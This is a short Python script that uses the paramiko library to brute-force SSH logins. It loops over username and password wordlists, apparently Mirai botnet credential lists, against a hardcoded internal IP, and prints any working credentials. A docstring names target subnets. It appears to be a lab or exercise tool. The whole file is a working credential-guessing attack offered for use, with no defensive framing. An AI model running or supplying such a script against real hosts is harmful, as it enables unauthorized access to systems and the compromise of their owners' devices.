import paramiko

'''
Target subnets:
    - 10.12.0.0/24
    - 10.1.0.0/24

First 24 bits (3 bytes) are fixed so we are only going to attack 8 bits > 2**8 * 2 ip addresses to test

'''
def read_file_to_list(file_path):
    lines = []
    try:
        with open(file_path, 'r') as file:
            lines = [line.rstrip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return lines

def ssh_connect(ip_address, username, password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh_client.connect(ip_address, username=username, password=password)
        
        ssh_client.close()
        return 0
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
        return 1
    except paramiko.SSHException as ssh_err:
        print("Unable to establish SSH connection:", str(ssh_err))
        return 2
    except Exception as e:
        print("An error occurred:", str(e))
        return 3

def ssh_brute_force(ip_address, host_list, pass_list):
    for host in host_list:
        for passwd in pass_list:
            ret = ssh_connect(ip_address,host, passwd)
            if ret == 0:
                print(f"For IP address:{ip_address}")
                print(f"\t- username: {host}")
                print(f"\t- password: {passwd}")
                return 0
            elif ret == 2:
                # host refuses connection
                return 
            else:
                continue


if __name__=='__main__':
    ip = "10.2.0.1"
    users = read_file_to_list("./wordlists/mirai_users.txt")
    passwords = read_file_to_list("./wordlists/mirai_passwords.txt")
    ssh_brute_force(ip, users, passwords)

